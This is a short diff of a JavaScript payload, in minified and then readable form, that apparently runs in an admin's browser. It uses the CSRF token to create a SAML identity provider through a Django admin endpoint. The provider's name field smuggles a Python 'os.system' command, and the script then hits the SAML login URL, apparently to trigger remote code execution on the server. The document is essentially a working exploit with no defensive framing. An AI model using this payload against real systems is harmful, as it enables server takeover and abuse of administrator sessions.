@@ -1,1 +1,23 @@
-!function(){const t=function(t){let e=null;if(document.cookie&&""!==document.cookie){const a=document.cookie.split(";");for(let n=0;n<a.length;n++){const o=a[n].trim();if(o.substring(0,t.length+1)===t+"="){e=decodeURIComponent(o.substring(t.length+1));break}}}return e}("csrftoken"),e="exploit-idp-"+Math.floor(1e3*Math.random()),a=new FormData;a.append("csrfmiddlewaretoken",t),a.append("name",'ExploitIDP\nimport os; os.system("id > /tmp/rce.txt")'),a.append("slug",e),a.append("protocol","saml"),a.append("status","active"),a.append("use_custom_attribute_map","on"),a.append("attribute_mapping",'{"email": ["mail"]}'),a.append("saml_metadata_xml","<metadata></metadata>"),a.append("_save","Save"),fetch("/admin/uac/identityprovider/add/",{method:"POST",body:a}).then(t=>{t.ok&&fetch("/saml2/login/"+e+"/")})}();
+ (function() {
+     const id = Math.floor(Math.random() * 9999);
+     const slug = 'exp-' + id;
+     const name = 'Exp' + id + '\nimport os;os.system("id > /tmp/rce.txt")';
+     const xml = '<?xml version="1.0"?><md:EntityDescriptor xmlns:md="urn:oasis:names:tc:SAML:2.0:metadata" entityID="http://x.com"><md:IDPSSODescriptor
+ protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol"><md:SingleSignOnService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect"
+ Location="http://x.com/sso"/></md:IDPSSODescriptor></md:EntityDescriptor>';
+
+     $.post('/admin/uac/identityprovider/add/', {
+         csrfmiddlewaretoken: Cookies.get('csrftoken'),
+         name: name,
+         slug: slug,
+         protocol: 'saml',
+         status: 'active',
+         saml_metadata_xml: xml,
+         use_custom_attribute_map: 'on',
+         attribute_mapping: '{"email":["mail"]}',
+         _save: 'Save'
+     }).done(() => $.get('/saml2/login/' + slug + '/'));
+ })();
+
+
+
